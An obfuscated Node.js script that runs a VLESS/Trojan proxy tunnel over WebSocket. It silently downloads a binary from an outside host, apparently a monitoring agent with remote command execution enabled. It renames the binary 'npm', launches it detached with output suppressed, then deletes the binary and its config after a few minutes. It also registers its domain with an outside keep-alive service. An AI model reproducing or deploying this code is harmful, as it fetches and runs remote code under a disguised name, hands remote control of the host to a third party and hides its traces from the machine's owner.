const _0x5d74ac=_0x7c17;(function(_0x4c5346,_0x53c8cd){const _0x106e8d=_0x7c17,_0x1cac1a=_0x4c5346();while(!![]){try{const _0x4a697a=parseInt(_0x106e8d(0x198))/0x1*(parseInt(_0x106e8d(0x1aa))/0x2)+parseInt(_0x106e8d(0x1d8))/0x3+-parseInt(_0x106e8d(0x1c5))/0x4*(-parseInt(_0x106e8d(0x205))/0x5)+parseInt(_0x106e8d(0x1ff))/0x6*(parseInt(_0x106e8d(0x1fd))/0x7)+-parseInt(_0x106e8d(0x1b2))/0x8+parseInt(_0x106e8d(0x1c4))/0x9+parseInt(_0x106e8d(0x20a))/0xa*(-parseInt(_0x106e8d(0x1e4))/0xb);if(_0x4a697a===_0x53c8cd)break;else _0x1cac1a['push'](_0x1cac1a['shift']());}catch(_0x28f689){_0x1cac1a['push'](_0x1cac1a['shift']());}}}(_0x35b5,0xdb3d3));const os=require('os'),http=require(_0x5d74ac(0x1e1)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require(_0x5d74ac(0x1af)),{Buffer}=require(_0x5d74ac(0x1d0)),{exec,execSync}=require(_0x5d74ac(0x1f3)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x5d74ac(0x201),NEZHA_SERVER=process[_0x5d74ac(0x196)][_0x5d74ac(0x1fe)]||'',NEZHA_PORT=process[_0x5d74ac(0x196)][_0x5d74ac(0x1cf)]||'',NEZHA_KEY=process[_0x5d74ac(0x196)]['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env'][_0x5d74ac(0x1a9)]||!![],WSPATH=process['env'][_0x5d74ac(0x1a2)]||UUID[_0x5d74ac(0x1c8)](0x0,0x8),SUB_PATH=process[_0x5d74ac(0x196)]['SUB_PATH']||_0x5d74ac(0x202),NAME=process[_0x5d74ac(0x196)]['NAME']||_0x5d74ac(0x210),PORT=process[_0x5d74ac(0x196)][_0x5d74ac(0x1b7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3b9958=_0x5d74ac;try{const _0x14aebc=await axios[_0x3b9958(0x1ec)](_0x3b9958(0x1b6)),_0x91f766=_0x14aebc[_0x3b9958(0x20f)];ISP=(_0x91f766[_0x3b9958(0x1e0)]+'-'+_0x91f766[_0x3b9958(0x1f6)])[_0x3b9958(0x1e9)](/ /g,'_');}catch(_0x4aca30){ISP=_0x3b9958(0x207);}};GetISP();const httpServer=http[_0x5d74ac(0x211)]((_0x5594e4,_0x36f9b0)=>{const _0xb9d4c7=_0x5d74ac;if(_0x5594e4[_0xb9d4c7(0x1d6)]==='/'){const _0x1727cf=path[_0xb9d4c7(0x1eb)](__dirname,'index.html');fs[_0xb9d4c7(0x200)](_0x1727cf,_0xb9d4c7(0x1e2),(_0x18e20f,_0x46986b)=>{const _0x26c8e3=_0xb9d4c7;if(_0x18e20f){_0x36f9b0[_0x26c8e3(0x1de)](0xc8,{'Content-Type':'text/html'}),_0x36f9b0['end'](_0x26c8e3(0x1ca));return;}_0x36f9b0[_0x26c8e3(0x1de)](0xc8,{'Content-Type':_0x26c8e3(0x203)}),_0x36f9b0['end'](_0x46986b);});return;}else{if(_0x5594e4[_0xb9d4c7(0x1d6)]==='/'+SUB_PATH){const _0x3bce32='vless://'+UUID+'@'+DOMAIN+_0xb9d4c7(0x1db)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x40c281=_0xb9d4c7(0x19d)+UUID+'@'+DOMAIN+_0xb9d4c7(0x20c)+DOMAIN+_0xb9d4c7(0x1c3)+DOMAIN+_0xb9d4c7(0x1a8)+WSPATH+'#'+NAME+'-'+ISP,_0xde551c=_0x3bce32+'\x0a'+_0x40c281,_0x41e3b6=Buffer['from'](_0xde551c)[_0xb9d4c7(0x1d4)](_0xb9d4c7(0x199));_0x36f9b0['writeHead'](0xc8,{'Content-Type':_0xb9d4c7(0x1a3)}),_0x36f9b0[_0xb9d4c7(0x1ce)](_0x41e3b6+'\x0a');}else _0x36f9b0[_0xb9d4c7(0x1de)](0x194,{'Content-Type':_0xb9d4c7(0x1a3)}),_0x36f9b0['end'](_0xb9d4c7(0x1d1));}}),wss=new WebSocket[(_0x5d74ac(0x1fc))]({'server':httpServer}),uuid=UUID[_0x5d74ac(0x1e9)](/-/g,''),DNS_SERVERS=[_0x5d74ac(0x1ad),_0x5d74ac(0x1ac)];function _0x7c17(_0x52383a,_0x4e4a6f){_0x52383a=_0x52383a-0x193;const _0x35b53a=_0x35b5();let _0x7c170c=_0x35b53a[_0x52383a];return _0x7c170c;}function resolveHost(_0x84d65d){return new Promise((_0x19e3b3,_0x216e9c)=>{const _0x5e860c=_0x7c17;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5e860c(0x1e8)](_0x84d65d)){_0x19e3b3(_0x84d65d);return;}let _0x15980f=0x0;function _0x35b6c1(){const _0x419667=_0x5e860c;if(_0x15980f>=DNS_SERVERS[_0x419667(0x1ea)]){_0x216e9c(new Error(_0x419667(0x1b8)+_0x84d65d+_0x419667(0x1c9)));return;}const _0x59478d=DNS_SERVERS[_0x15980f];_0x15980f++;const _0x2d518c=_0x419667(0x1f7)+encodeURIComponent(_0x84d65d)+_0x419667(0x1b5);axios[_0x419667(0x1ec)](_0x2d518c,{'timeout':0x1388,'headers':{'Accept':_0x419667(0x1b1)}})['then'](_0x462e8d=>{const _0x3744c1=_0x419667,_0x191db5=_0x462e8d['data'];if(_0x191db5[_0x3744c1(0x1cd)]===0x0&&_0x191db5[_0x3744c1(0x1c0)]&&_0x191db5[_0x3744c1(0x1c0)]['length']>0x0){const _0x1fc61b=_0x191db5[_0x3744c1(0x1c0)][_0x3744c1(0x1cb)](_0x6460a7=>_0x6460a7[_0x3744c1(0x195)]===0x1);if(_0x1fc61b){_0x19e3b3(_0x1fc61b[_0x3744c1(0x20f)]);return;}}_0x35b6c1();})[_0x419667(0x19b)](_0x15be00=>{_0x35b6c1();});}_0x35b6c1();});}function _0x35b5(){const _0x145562=['every','type','env','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2CdXGyA','base64','2083','catch','npm\x20running\x20error:','trojan://','createHash','Automatic\x20Access\x20Task\x20added\x20successfully','decode','utf-8','WSPATH','text/plain','--tls','connect','aarch64','client_secret:\x20','&path=%2F','AUTO_ACCESS','1164108uefoRj','digest','1.1.1.1','8.8.4.4','substr','crypto','readUInt8','application/dns-json','8694272YmzBrx','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','concat','&type=A','https://speed.cloudflare.com/meta','PORT','Failed\x20to\x20resolve\x20','pipe','then','8443','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','443','Answer','arm','trim','&fp=chrome&type=ws&host=','669150WSWySn','62412SUuJzC','unlink','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','slice','\x20with\x20all\x20DNS\x20servers','Hello\x20world!','find','npm\x20is\x20running','Status','end','NEZHA_PORT','buffer','Not\x20Found\x0a','arch','https://arm64.ssss.nyc.mn/v1','toString','update','url','post','5103009gikobZ','log','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',':443?encryption=none&security=tls&sni=','split','stream','writeHead','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country','http','utf8','readUInt16BE','347842YrttPd','message','connection','/bin/bash','test','replace','length','join','get','reduce','close','npm','https://amd64.ssss.nyc.mn/agent','\x20-p\x20','config.yaml','child_process','writeFileSync','false','asOrganization','https://dns.google/resolve?name=','error','https://amd64.ssss.nyc.mn/v1','finish','npm\x20is\x20already\x20running,\x20skip\x20running...','Server','49Dnayct','NEZHA_SERVER','508938xVqhEa','readFile','c08eadc8-2f92-4c74-b7f4-335dac55d869','840927','text/html','write','355NJcXOB','createWriteStream','Unknown','sha224','includes','840PMGNuv','https://',':443?security=tls&sni=','error:\x20','https://arm64.ssss.nyc.mn/agent','data','Hug','createServer','arm64','map'];_0x35b5=function(){return _0x145562;};return _0x35b5();}function handleVlessConnection(_0x5a7337,_0x42b9fe){const _0x32356d=_0x5d74ac,[_0x516b74]=_0x42b9fe,_0x5e5bd2=_0x42b9fe[_0x32356d(0x1c8)](0x1,0x11);if(!_0x5e5bd2[_0x32356d(0x194)]((_0x5607b7,_0x5374ea)=>_0x5607b7==parseInt(uuid['substr'](_0x5374ea*0x2,0x2),0x10)))return![];let _0x3e67aa=_0x42b9fe['slice'](0x11,0x12)[_0x32356d(0x1b0)]()+0x13;const _0x3c80d5=_0x42b9fe[_0x32356d(0x1c8)](_0x3e67aa,_0x3e67aa+=0x2)[_0x32356d(0x1e3)](0x0),_0x193a85=_0x42b9fe[_0x32356d(0x1c8)](_0x3e67aa,_0x3e67aa+=0x1)[_0x32356d(0x1b0)](),_0x2a6e89=_0x193a85==0x1?_0x42b9fe[_0x32356d(0x1c8)](_0x3e67aa,_0x3e67aa+=0x4)[_0x32356d(0x1eb)]('.'):_0x193a85==0x2?new TextDecoder()[_0x32356d(0x1a0)](_0x42b9fe[_0x32356d(0x1c8)](_0x3e67aa+0x1,_0x3e67aa+=0x1+_0x42b9fe['slice'](_0x3e67aa,_0x3e67aa+0x1)[_0x32356d(0x1b0)]())):_0x193a85==0x3?_0x42b9fe[_0x32356d(0x1c8)](_0x3e67aa,_0x3e67aa+=0x10)[_0x32356d(0x1ed)]((_0x356a29,_0x2fc8be,_0xd91be3,_0x5ce917)=>_0xd91be3%0x2?_0x356a29[_0x32356d(0x1b4)](_0x5ce917[_0x32356d(0x1c8)](_0xd91be3-0x1,_0xd91be3+0x1)):_0x356a29,[])[_0x32356d(0x193)](_0x2d2375=>_0x2d2375[_0x32356d(0x1e3)](0x0)[_0x32356d(0x1d4)](0x10))[_0x32356d(0x1eb)](':'):'';_0x5a7337['send'](new Uint8Array([_0x516b74,0x0]));const _0x3ce9ad=createWebSocketStream(_0x5a7337);return resolveHost(_0x2a6e89)[_0x32356d(0x1ba)](_0x16c59f=>{const _0x402497=_0x32356d;net[_0x402497(0x1a5)]({'host':_0x16c59f,'port':_0x3c80d5},function(){const _0x1fb8c5=_0x402497;this[_0x1fb8c5(0x204)](_0x42b9fe[_0x1fb8c5(0x1c8)](_0x3e67aa)),_0x3ce9ad['on']('error',()=>{})[_0x1fb8c5(0x1b9)](this)['on'](_0x1fb8c5(0x1f8),()=>{})[_0x1fb8c5(0x1b9)](_0x3ce9ad);})['on'](_0x402497(0x1f8),()=>{});})[_0x32356d(0x19b)](_0x1f9664=>{const _0x348db7=_0x32356d;net[_0x348db7(0x1a5)]({'host':_0x2a6e89,'port':_0x3c80d5},function(){const _0x3e099a=_0x348db7;this['write'](_0x42b9fe['slice'](_0x3e67aa)),_0x3ce9ad['on'](_0x3e099a(0x1f8),()=>{})[_0x3e099a(0x1b9)](this)['on'](_0x3e099a(0x1f8),()=>{})['pipe'](_0x3ce9ad);})['on'](_0x348db7(0x1f8),()=>{});}),!![];}function handleTrojanConnection(_0x3dd3f7,_0x4c616e){const _0xd0e82f=_0x5d74ac;try{if(_0x4c616e[_0xd0e82f(0x1ea)]<0x3a)return![];const _0x2a361f=_0x4c616e[_0xd0e82f(0x1c8)](0x0,0x38)[_0xd0e82f(0x1d4)](),_0x2c2a83=[UUID];let _0x23231f=null;for(const _0x4189ad of _0x2c2a83){const _0x420f6f=crypto[_0xd0e82f(0x19e)](_0xd0e82f(0x208))[_0xd0e82f(0x1d5)](_0x4189ad)[_0xd0e82f(0x1ab)]('hex');if(_0x420f6f===_0x2a361f){_0x23231f=_0x4189ad;break;}}if(!_0x23231f)return![];let _0x28a43e=0x38;_0x4c616e[_0x28a43e]===0xd&&_0x4c616e[_0x28a43e+0x1]===0xa&&(_0x28a43e+=0x2);const _0x3bae4d=_0x4c616e[_0x28a43e];if(_0x3bae4d!==0x1)return![];_0x28a43e+=0x1;const _0x1eba6b=_0x4c616e[_0x28a43e];_0x28a43e+=0x1;let _0x118fc4,_0x21055f;if(_0x1eba6b===0x1)_0x118fc4=_0x4c616e['slice'](_0x28a43e,_0x28a43e+0x4)[_0xd0e82f(0x1eb)]('.'),_0x28a43e+=0x4;else{if(_0x1eba6b===0x3){const _0xf0bad=_0x4c616e[_0x28a43e];_0x28a43e+=0x1,_0x118fc4=_0x4c616e['slice'](_0x28a43e,_0x28a43e+_0xf0bad)[_0xd0e82f(0x1d4)](),_0x28a43e+=_0xf0bad;}else{if(_0x1eba6b===0x4)_0x118fc4=_0x4c616e[_0xd0e82f(0x1c8)](_0x28a43e,_0x28a43e+0x10)[_0xd0e82f(0x1ed)]((_0x444be5,_0x571683,_0x7d1bb7,_0x9a4bd8)=>_0x7d1bb7%0x2?_0x444be5[_0xd0e82f(0x1b4)](_0x9a4bd8['slice'](_0x7d1bb7-0x1,_0x7d1bb7+0x1)):_0x444be5,[])[_0xd0e82f(0x193)](_0x41dbfd=>_0x41dbfd['readUInt16BE'](0x0)[_0xd0e82f(0x1d4)](0x10))['join'](':'),_0x28a43e+=0x10;else return![];}}_0x21055f=_0x4c616e[_0xd0e82f(0x1e3)](_0x28a43e),_0x28a43e+=0x2;_0x28a43e<_0x4c616e['length']&&_0x4c616e[_0x28a43e]===0xd&&_0x4c616e[_0x28a43e+0x1]===0xa&&(_0x28a43e+=0x2);const _0x4fe259=createWebSocketStream(_0x3dd3f7);return resolveHost(_0x118fc4)[_0xd0e82f(0x1ba)](_0x5a34cf=>{const _0x483269=_0xd0e82f;net[_0x483269(0x1a5)]({'host':_0x5a34cf,'port':_0x21055f},function(){const _0x24e9d6=_0x483269;_0x28a43e<_0x4c616e[_0x24e9d6(0x1ea)]&&this['write'](_0x4c616e[_0x24e9d6(0x1c8)](_0x28a43e)),_0x4fe259['on'](_0x24e9d6(0x1f8),()=>{})[_0x24e9d6(0x1b9)](this)['on']('error',()=>{})[_0x24e9d6(0x1b9)](_0x4fe259);})['on'](_0x483269(0x1f8),()=>{});})['catch'](_0x3abdc0=>{const _0x15133c=_0xd0e82f;net[_0x15133c(0x1a5)]({'host':_0x118fc4,'port':_0x21055f},function(){const _0x1b62fa=_0x15133c;_0x28a43e<_0x4c616e[_0x1b62fa(0x1ea)]&&this[_0x1b62fa(0x204)](_0x4c616e[_0x1b62fa(0x1c8)](_0x28a43e)),_0x4fe259['on'](_0x1b62fa(0x1f8),()=>{})['pipe'](this)['on'](_0x1b62fa(0x1f8),()=>{})[_0x1b62fa(0x1b9)](_0x4fe259);})['on']('error',()=>{});}),!![];}catch(_0x2c374a){return![];}}wss['on'](_0x5d74ac(0x1e6),(_0x334cb2,_0x4969bf)=>{const _0x5829c0=_0x5d74ac,_0x3a3287=_0x4969bf['url']||'';_0x334cb2['once'](_0x5829c0(0x1e5),_0x4460f3=>{const _0x46e6aa=_0x5829c0;if(_0x4460f3['length']>0x11&&_0x4460f3[0x0]===0x0){const _0x4ddfcb=_0x4460f3[_0x46e6aa(0x1c8)](0x1,0x11),_0x3a7bbb=_0x4ddfcb[_0x46e6aa(0x194)]((_0x265210,_0x3ed95e)=>_0x265210==parseInt(uuid[_0x46e6aa(0x1ae)](_0x3ed95e*0x2,0x2),0x10));if(_0x3a7bbb){!handleVlessConnection(_0x334cb2,_0x4460f3)&&_0x334cb2[_0x46e6aa(0x1ee)]();return;}}!handleTrojanConnection(_0x334cb2,_0x4460f3)&&_0x334cb2[_0x46e6aa(0x1ee)]();})['on'](_0x5829c0(0x1f8),()=>{});});const getDownloadUrl=()=>{const _0x5b1423=_0x5d74ac,_0x50e849=os[_0x5b1423(0x1d2)]();return _0x50e849===_0x5b1423(0x1c1)||_0x50e849===_0x5b1423(0x212)||_0x50e849===_0x5b1423(0x1a6)?!NEZHA_PORT?_0x5b1423(0x1d3):_0x5b1423(0x20e):!NEZHA_PORT?_0x5b1423(0x1f9):_0x5b1423(0x1f0);},downloadFile=async()=>{const _0x284548=_0x5d74ac;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3f594b=getDownloadUrl(),_0x3e8284=await axios({'method':_0x284548(0x1ec),'url':_0x3f594b,'responseType':_0x284548(0x1dd)}),_0x3b204c=fs[_0x284548(0x206)](_0x284548(0x1ef));return _0x3e8284['data']['pipe'](_0x3b204c),new Promise((_0x6f1f6,_0x33fb94)=>{const _0x9b93f3=_0x284548;_0x3b204c['on'](_0x9b93f3(0x1fa),()=>{const _0x99b623=_0x9b93f3;console[_0x99b623(0x1d9)](_0x99b623(0x1bd)),exec('chmod\x20+x\x20npm',_0x5a62c1=>{if(_0x5a62c1)_0x33fb94(_0x5a62c1);_0x6f1f6();});}),_0x3b204c['on'](_0x9b93f3(0x1f8),_0x33fb94);});}catch(_0x109539){throw _0x109539;}},runnz=async()=>{const _0x5976bc=_0x5d74ac;try{const _0x5edb98=execSync(_0x5976bc(0x197),{'encoding':_0x5976bc(0x1a1)});if(_0x5edb98[_0x5976bc(0x1c2)]()!==''){console[_0x5976bc(0x1d9)](_0x5976bc(0x1fb));return;}}catch(_0x144b00){}await downloadFile();let _0x526bd7='',_0x4e4223=[_0x5976bc(0x1bf),_0x5976bc(0x1bb),'2096','2087',_0x5976bc(0x19a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2bfabd=_0x4e4223[_0x5976bc(0x209)](NEZHA_PORT)?_0x5976bc(0x1a4):'';_0x526bd7='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5976bc(0x1f1)+NEZHA_KEY+'\x20'+_0x2bfabd+_0x5976bc(0x1b3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b0f0d=NEZHA_SERVER[_0x5976bc(0x209)](':')?NEZHA_SERVER[_0x5976bc(0x1dc)](':')['pop']():'',_0x2092fb=_0x4e4223[_0x5976bc(0x209)](_0x5b0f0d)?'true':_0x5976bc(0x1f5),_0x511742=_0x5976bc(0x1a7)+NEZHA_KEY+_0x5976bc(0x1df)+NEZHA_SERVER+_0x5976bc(0x1da)+_0x2092fb+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5976bc(0x1f4)](_0x5976bc(0x1f2),_0x511742);}_0x526bd7=_0x5976bc(0x1c7);}else{console[_0x5976bc(0x1d9)](_0x5976bc(0x1be));return;}}try{exec(_0x526bd7,{'shell':_0x5976bc(0x1e7)},_0x29f744=>{const _0x1585b5=_0x5976bc;if(_0x29f744)console[_0x1585b5(0x1f8)](_0x1585b5(0x19c),_0x29f744);else console[_0x1585b5(0x1d9)](_0x1585b5(0x1cc));});}catch(_0xf7bcab){console[_0x5976bc(0x1f8)](_0x5976bc(0x20d)+_0xf7bcab);}};async function addAccessTask(){const _0x3750d8=_0x5d74ac;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x24f62f=_0x3750d8(0x20b)+DOMAIN;try{const _0x4c3200=await axios[_0x3750d8(0x1d7)]('https://oooo.serv00.net/add-url',{'url':_0x24f62f},{'headers':{'Content-Type':'application/json'}});console[_0x3750d8(0x1d9)](_0x3750d8(0x19f));}catch(_0x61bfd5){}}const delFiles=()=>{const _0x834f84=_0x5d74ac;fs[_0x834f84(0x1c6)]('npm',()=>{}),fs['unlink'](_0x834f84(0x1f2),()=>{});};httpServer['listen'](PORT,()=>{const _0xce136=_0x5d74ac;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xce136(0x1d9)](_0xce136(0x1bc)+PORT);});
